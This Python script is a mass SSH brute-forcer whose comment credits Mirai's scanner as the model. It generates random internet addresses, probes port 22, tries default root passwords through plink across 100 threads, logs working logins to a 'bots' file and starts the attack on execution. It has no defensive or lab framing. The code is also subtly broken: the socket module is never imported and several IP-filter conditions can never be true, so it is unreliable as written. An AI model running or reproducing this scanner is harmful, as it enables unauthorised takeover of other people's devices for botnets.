import subprocess,time,random,threading
def getip():
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=random.randint(1,253)
  o2=random.randint(0,254)
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
def ssh_win(ip,username,password,p=22,timeout=5):
 #ssh login for windows (requires putty: plink )
 try:
  l='echo y | plink -ssh -l {} -pw {} {} -P {} exit'.format(username,password,ip,p)
  ti=time.time()
  ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
  while ssh.poll() is None:
   time.sleep(.1)
   if int(time.time()-ti)==timeout:
       try:
        ssh.kill()
       except:
        pass
       return False
  try:
   ssh.kill()
  except:
   pass
  if (ssh.communicate()[0].decode('utf-8')==''):
     return True
  else:
     return False
 except:
  pass
 return False

def write_file(w,fi):
    with open(fi ,"a+") as f:
        f.write(w+'\n')
        return   
def read_file(w):
    with open(w ,"r") as f:
        return f.readlines()
def create_file(w):
    with open(w ,"a+") as f:
     pass   

stop=False
_timeout=5
ip_seg=None
filen=None
wordlist=["root:root", "root:", "root:admin", "root:!root", "root:toor"]



class iots(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  self.timeout=_timeout
  time.sleep(2)
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(self.timeout)
    so.connect((ip,22))
    i=True
    print(ip)
    so.close()
   except Exception as ex: 
    pass
   if i==True:
    for x in wordlist:
     if stop==True:
         break
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      print(ip,username,password)
      q=ssh_win(ip,username,password,timeout=self.timeout)
      if q==True:
       ip+=':'+username+':'+password
       print (ip)
       write_file(ip,filen)
       break
     except Exception as e: 
      print(e)
  self.ip_seg=None
  self.timeout=None
def mass_ssh(threads=500,word_list=wordlist,filename='ssh_bots.txt',ip_range=None,timeout=5):
 global stop
 stop=False
 global _timeout
 _timeout=timeout
 global ip_seg
 ip_seg=ip_range
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iots().start()
   thr.append(t)
   time.sleep(0.001)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x

mass_ssh(threads=100,word_list=wordlist)
